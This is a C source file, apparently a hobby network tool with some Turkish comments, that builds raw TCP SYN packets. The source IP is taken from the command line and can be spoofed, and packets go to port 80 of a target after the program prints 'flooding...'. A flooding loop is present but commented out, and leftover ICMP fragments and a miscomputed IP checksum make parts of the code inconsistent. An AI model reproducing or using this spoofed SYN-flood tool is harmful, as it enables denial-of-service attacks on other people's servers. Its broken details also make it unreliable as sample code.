#include <stdio.h>
#include <stdlib.h>
#include <string.h> //memset
#include <sys/time.h>
#include <netinet/ip.h>
// #include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <unistd.h>

#include <sys/socket.h>	//for socket ofcourse
#include <arpa/inet.h> // inet_addr


typedef unsigned char u8;
typedef unsigned short int u16;

unsigned short in_cksum(unsigned short *ptr, int nbytes);
void help(const char *p);



/* 
	96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
*/
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

/*
	Generic checksum calculation function
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}
// end of https://www.binarytides.com/raw-sockets-c-code-linux/



int main(int argc, char **argv)
{
	if (argc < 3) 
	{
		printf("usage: %s <source IP> <destination IP> [payload size]\n", argv[0]);
		exit(0);
	}
	
	unsigned long daddr; //hedefin ipsi
	unsigned long saddr; //kaynak ipsi

	int payload_size = 0, sent, sent_size;
	
	saddr = inet_addr(argv[1]); //kaynak ipsi ni argdan çevirdik
	daddr = inet_addr(argv[2]); //hedefin ipsi ni argdan çevirdik
	
	if (argc > 3)
	{
		payload_size = atoi(argv[3]);
	}
	
	//Raw socket - if you use IPPROTO_ICMP, then kernel will fill in the correct ICMP header checksum, if IPPROTO_RAW, then it wont
	int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP); // socketi oluşturduk
	
	if (sockfd < 0) 
	{
		perror("could not create socket");
		return (0);
	}
	
	int on = 1;
	
	// We shall provide IP headers
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}
	
	//allow socket to send datagrams to broadcast addresses
	if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}	
	
	//Calculate total packet size
	int packet_size = sizeof (struct iphdr) + sizeof(struct tcphdr) + payload_size;
	char *packet = (char *) malloc (packet_size);
				   
	if (!packet) 
	{
		perror("out of memory");
		close(sockfd);
		return (0);
	}
	
	//ip header
	struct iphdr *ip = (struct iphdr *) packet;

	//zero out the packet buffer
	memset (packet, 0, packet_size);

	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = htons (packet_size);
	ip->id = rand ();
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = IPPROTO_TCP;
	ip->saddr = saddr;
	ip->daddr = daddr;
	// ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));
	ip->check = csum ((unsigned short *) packet, ip->tot_len);
	

	// ICMP Header
	//struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));

  	//icmp->type = ICMP_ECHO;
	//icmp->code = 0;
  	//icmp->un.echo.sequence = rand();
  	//icmp->un.echo.id = rand();
  	//checksum
	//icmp->checksum = 0;
	
	/* TCP Header Old
	tcp->th_flags = TH_SYN;
	tcp->th_sport = htons(rand());
	tcp->th_dport = htons(rand());
	tcp->th_ack = 1;
	tcp->seq = rand();
	tcp->doff = 5;
	//tcp->c
	tcp->th_win = htons(65535);
	tcp->th_sum = 0xc886;	
	*/
	
	// TCP header
	struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof (struct iphdr));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	// TCP Header
	tcp->source = htons (1234);
	tcp->dest = htons (80);
	tcp->seq = 0;
	tcp->ack_seq = 0;
	tcp->doff = 5;	//tcp header size
	
	
	tcp->fin=0;
	tcp->syn=1;
	tcp->rst=0;
	tcp->psh=0;
	tcp->ack=0;
	tcp->urg=0;
	tcp->window = htons (5840);	/* maximum allowed window size */
	tcp->check = 0;	//leave checksum 0 now, filled later by pseudo header
	tcp->urg_ptr = 0;
	
	// Datagram to represent the packet
	char datagram[4096], *pseudogram;
	
	//Now the TCP checksum
	psh.source_address = saddr;
	psh.dest_address = daddr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr));
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
	pseudogram = malloc(psize);
	
	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , tcp , sizeof(struct tcphdr));
	
	tcp->check = csum( (unsigned short*) pseudogram , psize);
	
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	


	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = daddr;
	memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

	puts("flooding...");
	
	//memset(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), 'm', payload_size);
	if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
	{
		perror("send failed\n");
		return (0);
	}
	
	/*
	while (1)
	{
		memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
		
		//recalculate the icmp header checksum since we are filling the payload with random characters everytime
		icmp->checksum = 0;
		icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
		
		if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
		{
			perror("send failed\n");
			break;
		}
		++sent;
		printf("%d packets sent\r", sent);
		fflush(stdout);
		
		usleep(10000);	//microseconds
	}
	*/
	
	free(packet);
	close(sockfd);
	
	return (0);
}

/*
	Function calculate checksum

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;

	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}

	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) & oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return (answer);
}

*/